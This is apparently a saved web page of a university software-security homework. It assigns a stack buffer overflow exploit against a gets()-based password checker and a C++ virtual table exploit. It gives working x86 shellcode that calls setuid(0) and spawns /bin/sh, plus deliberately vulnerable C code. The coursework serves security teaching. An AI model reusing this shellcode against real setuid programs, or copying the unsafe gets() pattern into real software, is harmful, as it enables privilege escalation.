@@ -1,0 +1,92 @@
+
+<!-- saved from url=(0048)https://www.engr.scu.edu/~slam3/coen225/hw2.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body>Homework 2 (5%) ***can work in pairs or individually ***
+<br>
+Due: Oct 18, 2022 12am by email, to slam3@scu.edu
+<br>
+<pre>PROBLEM 1: Password check exploit using shell code injection.
+
+Given the following program
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+int IsPasswordOK(void) 
+{ 
+  char Password [256];
+//printf("Password at %p\n",&amp;Password[0]);
+  (void) gets(Password);
+  return 0 == strcmp (Password, "goodpass"); 
+}
+int main (void) 
+{
+  int PwStatus;
+  puts("Enter Password: "); 
+  PwStatus=IsPasswordOK( );
+  if (!PwStatus) {
+    puts("Access denied");
+    exit(-1);
+  }
+  else
+    puts("Access granted");
+}
+
+create an exploit input that causes the program to open up a root shell on screen.
+
+$ ./a.out &lt; exploit.input
+#
+
+This program is almost identical to the one covered in class/video, except Password has been increased to a length of 256.
+
+Note that the class video gives you a non-root shell.
+
+When a root program such as /etc/IsPasswordOk has UID bit set:
+
+user@vm-coen225:~$ ls -lt /etc/IsPasswordOk
+-rwsr-xr-x 1 root root 8904 Sep 25 21:21 /etc/IsPasswordOk
+
+running the program will elevate the user to root and the program can read root's files, 
+but if the program does a system/execve call to spawn a shell,
+the new shell will drop back down to normal user privilege.
+To maintain the root privilege, the program has to call setuid(0) before calling system/execve.
+
+Read the following article for details:
+https://bluehood.github.io/shellcode/3-2-entry.html
+
+Long story short, you can just add the 3rd line below to the class video shellcode to call setuid(0):
+
+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
+"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
+"\x6a\x17\x58\x31\xdb\xcd\x80" // &lt;-----these 7 bytes will call setuid(0)
+"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+One more change from the class video is the shellcode has to be placed in the beginning, at &amp;Password[0],
+as opposed to after the return address field.
+
+Submit the C program that generates the input (printnop2.c in the video) as problem1.c as an attachment to the email.
+
+PROBLEM 2 : C++ Virtual Table Exploit
+
+Given the following C++ program, create an exploit
+<a href="https://www.engr.scu.edu/~slam3/coen225/employee.cc">
+employee.cc
+</a>
+The exploit should enable the Janitor object to invoke President's pay function, but keep Janitor's info function.
+
+THe output should look like:
+
+$ ./employee &lt; /tmp/employeeshell
+To view employee info, please enter your name:
+john, 500000+100,000 bonus will be deposited to the account
+peter, 150000+10,000 bonus will be deposited to the account
+adam, 50000+100,000 bonus will be deposited to the account
+Title:President john
+Title:Director peter
+Title:Janitor adam
+
+Submit the C program that generates the input as problem2.c as an attachment to the email.
+
+***Send one single email to slam3@scu.edu with attachments corresponding to the problems.
+Email subject should have: hw2 solution from <your name="">
+In the email body, have 2 paragraphs, each describing how you solved each problem.
+</your></pre></body></html>
